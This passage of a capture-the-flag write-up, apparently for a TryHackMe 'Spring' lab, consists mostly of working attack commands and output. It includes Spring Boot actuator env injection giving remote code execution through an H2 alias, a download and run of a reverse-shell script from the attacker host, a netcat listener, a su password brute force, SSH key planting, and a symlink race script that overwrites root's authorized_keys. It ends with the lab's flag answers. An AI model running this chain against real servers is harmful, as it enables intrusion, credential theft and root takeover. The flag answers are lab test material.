curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\'java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'ping -c 5 10.8.106.222\');\"}' "https://10.10.6.25/actuator/env" -k
```

```json
{
  "spring.datasource.hikari.connection-test-query": "CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new','java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('ping -c 5 10.8.106.222');"
}
```

```bash
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://10.10.6.25/actuator/restart" -k
```

```json
{ "message": "Restarting" }
```

```bash
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'wget http://10.8.106.222/reverse.sh -O /tmp/reverse.sh\');\"}' "https://10.10.6.25/actuator/env" -k
```

```json
{
  "spring.datasource.hikari.connection-test-query": "CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('wget http://10.8.106.222/reverse.sh -O /tmp/reverse.sh');"
}
```

```bash
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://10.10.6.25/actuator/restart" -k
```

```json
{ "message": "Restarting" }
```

```bash
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'chmod +x /tmp/reverse.sh\');\"}' "https://10.10.6.25/actuator/env" -k
```

```json
{
  "spring.datasource.hikari.connection-test-query": "CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('chmod +x /tmp/reverse.sh');"
}
```

```bash
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://10.10.6.25/actuator/restart" -k
```

```json
{ "message": "Restarting" }
```

```bash
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'bash /tmp/reverse.sh\');\"}' "https://10.10.6.25/actuator/env" -k
```

```json
{
  "spring.datasource.hikari.connection-test-query": "CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('bash /tmp/reverse.sh');"
}
```

```bash
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://10.10.6.25/actuator/restart" -k
```

```json
{ "message": "Restarting" }
```

```
kali@kali:~/CTFs/tryhackme/Spring$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.6.25] 50702
bash: cannot set terminal process group (980): Inappropriate ioctl for device
bash: no job control in this shell
nobody@spring:/$ whoami
whoami
nobody
nobody@spring:/$ pwd
pwd
/
nobody@spring:/$ find / -name "foothold.txt" 2> /dev/null
find / -name "foothold.txt" 2> /dev/null
/opt/foothold.txt
nobody@spring:/$ cat /opt/foothold.txt
cat /opt/foothold.txt
THM{dont_expose_.git_to_internet}
```

```
kali@kali:~/CTFs/tryhackme/Spring$ cat /usr/share/wordlists/rockyou.txt | grep -E ^[A-Z][a-z]+$ > capitalized_words.txt
kali@kali:~/CTFs/tryhackme/Spring$ wc -l capitalized_words.txt
89652 capitalized_words.txt
```

```
nobody@spring:/tmp$ wget 10.8.106.222/capitalized_words.txt
wget 10.8.106.222/capitalized_words.txt
--2020-10-20 10:32:18--  http://10.8.106.222/capitalized_words.txt
Connecting to 10.8.106.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 800052 (781K) [text/plain]
Saving to: ‘capitalized_words.txt’

     0K .......... .......... .......... .......... ..........  6%  705K 1s
    50K .......... .......... .......... .......... .......... 12% 1.43M 1s
   100K .......... .......... .......... .......... .......... 19% 1.45M 1s
   150K .......... .......... .......... .......... .......... 25% 1.51M 0s
   200K .......... .......... .......... .......... .......... 31% 3.30M 0s
   250K .......... .......... .......... .......... .......... 38% 1.45M 0s
   300K .......... .......... .......... .......... .......... 44% 1.45M 0s
   350K .......... .......... .......... .......... .......... 51% 1.44M 0s
   400K .......... .......... .......... .......... .......... 57% 1.44M 0s
   450K .......... .......... .......... .......... .......... 63% 1.47M 0s
   500K .......... .......... .......... .......... .......... 70% 1.46M 0s
   550K .......... .......... .......... .......... .......... 76% 1.43M 0s
   600K .......... .......... .......... .......... .......... 83% 1.49M 0s
   650K .......... .......... .......... .......... .......... 89% 1.49M 0s
   700K .......... .......... .......... .......... .......... 95% 1.46M 0s
   750K .......... .......... .......... .                    100% 2.99M=0.5s

2020-10-20 10:32:18 (1.44 MB/s) - ‘capitalized_words.txt’ saved [800052/800052]

nobody@spring:/tmp$ wget 10.8.106.222/su_brute_force.sh
wget 10.8.106.222/su_brute_force.sh
--2020-10-20 10:32:48--  http://10.8.106.222/su_brute_force.sh
Connecting to 10.8.106.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1486 (1.5K) [text/x-sh]
Saving to: ‘su_brute_force.sh’

     0K .                                                     100% 3.20M=0s

2020-10-20 10:32:48 (3.20 MB/s) - ‘su_brute_force.sh’ saved [1486/1486]

nobody@spring:/tmp$ ls -la
ls -la
total 872
drwxrwxrwt 20 root   root      4096 Oct 20 10:32 .
drwxr-xr-x 24 root   root      4096 Jul  3 06:24 ..
-rw-r--r--  1 nobody nogroup 800052 Oct 20 10:28 capitalized_words.txt
drwxrwxrwt  2 root   root      4096 Oct 20 09:56 .font-unix
drwxr-xr-x  2 nobody nogroup   4096 Oct 20 09:56 hsperfdata_nobody
drwxrwxrwt  2 root   root      4096 Oct 20 09:56 .ICE-unix
-rw-r--r--  1 nobody nogroup     52 Oct 20 09:52 reverse.sh
-rw-r--r--  1 nobody nogroup   1486 Oct 20 10:32 su_brute_force.sh
drwx------  3 root   root      4096 Oct 20 09:56 systemd-private-2297f9f63b0546f98d142121a9cb3fbe-systemd-resolved.service-IV1TyL
drwx------  3 root   root      4096 Oct 20 09:56 systemd-private-2297f9f63b0546f98d142121a9cb3fbe-systemd-timesyncd.service-VayZgn
drwxrwxrwt  2 root   root      4096 Oct 20 09:56 .Test-unix
drwxr-xr-x  3 nobody nogroup   4096 Oct 20 10:02 tomcat.1413271874927061952.443
drwxr-xr-x  3 nobody nogroup   4096 Oct 20 09:57 tomcat.4121958550386458699.443
drwxr-xr-x  3 nobody nogroup   4096 Oct 20 10:23 tomcat.5071741172342460092.443
drwxr-xr-x  3 nobody nogroup   4096 Oct 20 10:16 tomcat.6434282224217597898.443
drwxr-xr-x  3 nobody nogroup   4096 Oct 20 10:12 tomcat.7769403354826430658.443
drwxr-xr-x  2 nobody nogroup   4096 Oct 20 10:12 tomcat-docbase.2314163272531024622.443
drwxr-xr-x  2 nobody nogroup   4096 Oct 20 10:23 tomcat-docbase.3582439175683483452.443
drwxr-xr-x  2 nobody nogroup   4096 Oct 20 10:02 tomcat-docbase.3624752303650085691.443
drwxr-xr-x  2 nobody nogroup   4096 Oct 20 10:16 tomcat-docbase.4010369964569599950.443
drwxr-xr-x  2 nobody nogroup   4096 Oct 20 09:57 tomcat-docbase.4863931693030932923.443
drwxrwxrwt  2 root   root      4096 Oct 20 09:56 .X11-unix
drwxrwxrwt  2 root   root      4096 Oct 20 09:56 .XIM-unix
nobody@spring:/tmp$ chmod +x su_brute_force.sh
chmod +x su_brute_force.sh
nobody@spring:/tmp$ time bash su_brute_force.sh capitalized_words.txt
time bash su_brute_force.sh capitalized_words.txt
Creds Found! johnsmith:PrettyS3cureAccountPassword123.
Password:
uid=1000(johnsmith) gid=1000(johnsmith) groups=1000(johnsmith)
Cracking : [##--------------------------------------] 7
```

```
nobody@spring:/$ python3 -c "import pty; pty.spawn('/bin/bash')"
python3 -c "import pty; pty.spawn('/bin/bash')"
nobody@spring:/$ su - johnsmith
su - johnsmith
Password: PrettyS3cureAccountPassword123.

johnsmith@spring:~$ ls -la
ls -la
total 44
drwxr-xr-x 7 johnsmith johnsmith 4096 Jul 10 19:57 .
drwxr-xr-x 3 root      root      4096 Jun 28 19:28 ..
lrwxrwxrwx 1 johnsmith johnsmith    9 Jul 10 19:14 .bash_history -> /dev/null
-rw-r--r-- 1 johnsmith johnsmith  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 johnsmith johnsmith 3771 Apr  4  2018 .bashrc
drwx------ 2 johnsmith johnsmith 4096 Jul 10 19:43 .cache
drwx------ 3 johnsmith johnsmith 4096 Jun 28 19:29 .gnupg
drwxrwxr-x 3 johnsmith johnsmith 4096 Jul 10 19:43 .local
-rw-r--r-- 1 johnsmith johnsmith  807 Apr  4  2018 .profile
drwx------ 2 johnsmith johnsmith 4096 Jul 10 19:16 .ssh
drwxrwxr-x 2 johnsmith johnsmith 4096 Oct 20 10:35 tomcatlogs
-r-------- 1 johnsmith johnsmith   34 Jul 10 19:57 user.txt
johnsmith@spring:~$ cat user.txt
cat user.txt
THM{this_is_still_password_reuse}
```

```
johnsmith@spring:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDO7GTxIFv/SEVqelwR1OrCvcDRsaOYuyU3JtdaFxv1IPMxp8soS007K9eeQyZvpSiU7ynIhwJsSrfhPH9PWvpPF937Ppe8+LX5e5b+5FsFMoVw6dkwWW2fNImlDcXf273vD/7bTRB+SBo+UcBuIR31ERpM+90xCNKv+HERbiq1TznnBZXJ16Pxu2VBfSCLF4ZjPO4BFG62IQQmkK1e3v3CeiF2b8t+lbS2LrUCbLKdPYvhH6rzoz1LoPwvNOryTivgjDhs/xGFBY3RThAKBiLJXTOAx4qLf4FMEo0Cr8y6GBz3mtLj/UJzNctwllvj4NwVgDpoTqt1EsMA+d1BQYlO5XF4CmhGbKyQamvgrXzdAUKgE1sZ1oel84A3POCrOGJdngPRM9EkUWI9H6619SVmohjukRfWRbMQaUz1mxCz8SUDJlGZWs9kJgKec/LqgjyJxH6VV3ArOKMdoaRQ3BNwHMVmONWFZVOvj+QzXtSWd+ubAdO4HdNwv/ehUj86Qzs= kali@kali" > /home/johnsmith/.ssh/authorized_keys
<= kali@kali" > /home/johnsmith/.ssh/authorized_keys
johnsmith@spring:~$
```

```
kali@kali:~/CTFs/tryhackme/Spring$ ssh -i ~/.ssh/id_rsa johnsmith@10.10.6.25
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 20 11:11:11 UTC 2020

  System load:  0.0                Processes:           101
  Usage of /:   11.7% of 58.80GB   Users logged in:     0
  Memory usage: 40%                IP address for eth0: 10.10.6.25
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

9 packages can be updated.
0 updates are security updates.


johnsmith@spring:~$ cat /etc/systemd/system/spring.service
[Unit]
Description=Spring Boot Application
After=syslog.target
StartLimitIntervalSec=0

[Service]
User=root
Restart=always
RestartSec=1
ExecStart=/root/start_tomcat.sh

[Install]
WantedBy=multi-user.target
johnsmith@spring:~$ systemctl status spring
● spring.service - Spring Boot Application
   Loaded: loaded (/etc/systemd/system/spring.service; enabled; vendor preset: enabled)
   Active: active (running) since Tue 2020-10-20 10:56:05 UTC; 18min ago
 Main PID: 841
    Tasks: 3 (limit: 1106)
   CGroup: /system.slice/spring.service
           ├─841 /bin/bash /root/start_tomcat.sh
           ├─852 sudo su nobody -s /bin/bash -c /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java -Djava.security.egd=file:///dev/urandom
           └─853 tee /home/johnsmith/tomcatlogs/1603191365.log

Warning: Journal has been rotated since unit was started. Log output is incomplete or unavailable.

johnsmith@spring:~$ cd tomcatlogs/
johnsmith@spring:~/tomcatlogs$ pwd
/home/johnsmith/tomcatlogs
```

```bash
target=$1

#send a shutdown request to the spring boot server
curl -X POST https://localhost/actuator/shutdown -H 'x-9ad42dea0356cb04: 172.16.0.21' -k

#get date as epoch format
d=$(date '+%s')

#let's assume 30 seconds is enough to restart the service
for i in {1..30}
do
 #create symlinks to target file for 30 seconds
 let time=$(( d + i ))
 ln -s $target "$time.log"
done
```

```
johnsmith@spring:~/tomcatlogs$ nano arbitrary_file_write.sh
johnsmith@spring:~/tomcatlogs$ bash arbitrary_file_write.sh /tmp/arbitrary_file_write.test
curl: (7) Failed to connect to localhost port 443: Connection refused
johnsmith@spring:~/tomcatlogs$ bash arbitrary_file_write.sh /tmp/arbitrary_file_write.test
{"message":"Shutting down, bye..."}
```

```
johnsmith@spring:~/tomcatlogs$ ls -la
total 268
drwxrwxr-x 2 johnsmith johnsmith   4096 Oct 20 11:21 .
drwxr-xr-x 7 johnsmith johnsmith   4096 Jul 10 19:57 ..
-rw-r--r-- 1 root      root        6928 Jul 10 19:42 1594410148.log
-rw-r--r-- 1 root      root        6728 Jul 10 19:47 1594410465.log
-rw-r--r-- 1 root      root        5237 Jul 10 20:38 1594413491.log
-rw-r--r-- 1 root      root        7194 Jul 12 11:13 1594552377.log
-rw-r--r-- 1 root      root        6990 Jul 12 17:26 1594574751.log
-rw-r--r-- 1 root      root        7429 Jul 12 17:36 1594575333.log
-rw-r--r-- 1 root      root        7182 Jul 12 17:47 1594576008.log
-rw-r--r-- 1 root      root        6725 Jul 12 20:07 1594584453.log
-rw-r--r-- 1 root      root      193976 Oct 20 11:21 1603191365.log
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192819.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192820.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192821.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192822.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192823.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192824.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192825.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192826.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192827.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192828.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192829.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192830.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192831.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192832.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192833.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192834.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192835.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192836.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192837.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192838.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192839.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192840.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192841.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192842.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192843.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192844.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192845.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192846.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192847.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192848.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192864.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192865.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192866.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192867.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192868.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192869.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192870.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192871.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192872.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192873.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192874.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192875.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192876.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192877.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192878.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192879.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192880.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192881.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192882.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192883.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192884.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192885.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192886.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192887.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192888.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192889.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192890.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192891.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192892.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192893.log -> /tmp/arbitrary_file_write.test
-rw-rw-r-- 1 johnsmith johnsmith    376 Oct 20 11:20 arbitrary_file_write.sh
```

```bash
#!/bin/bash

#generate ssh key if it does not exists
[ -f ./key ] && true || ssh-keygen -b 2048 -t ed25519 -f ./key -q -N ""
#read public key
pubkey=$(cat ./key.pub)

#send a shutdown request to the spring boot server
curl -X POST https://localhost/actuator/shutdown -H 'x-9ad42dea0356cb04: 172.16.0.21' -k

#get date as epoch format
d=$(date '+%s')

#let's assume 30 seconds is enough to restart the service
for i in {1..30}
do
 #create symlinks to /root/.ssh/authorized_keys for 30 seconds
 let time=$(( d + i ))
 ln -s /root/.ssh/authorized_keys "$time.log"
done

#wait for app to restart
sleep 30s

#send publickey as name to the greating server
curl --data-urlencode "name=$pubkey" https://localhost/ -k
sleep 5s

#connect as root
ssh  -o "StrictHostKeyChecking=no" -i ./key root@localhost
```

```
johnsmith@spring:~/tomcatlogs$ nano get_root.sh
johnsmith@spring:~/tomcatlogs$ bash get_root.sh
{"message":"Shutting down, bye..."}
whoami
Hello, ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILKTKMqNsInLM2tkn0LUwUH1ejRM1tm39w7FT9joN17E johnsmith@spring!Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.

whoami
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 20 11:24:59 UTC 2020

  System load:  0.62               Processes:           101
  Usage of /:   11.7% of 58.80GB   Users logged in:     1
  Memory usage: 35%                IP address for eth0: 10.10.6.25
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

9 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@spring:~# ls
root.txt  start_tomcat.sh
root@spring:~# cat root.txt
THM{sshd_does_not_mind_the_junk}
root@spring:~#
```

1. What's the flag in foothold.txt?

`THM{dont_expose_.git_to_internet}`

2. What's the flag in user.txt?

`THM{this_is_still_password_reuse}`

3. What's the flag in root.txt?

`THM{sshd_does_not_mind_the_junk}`
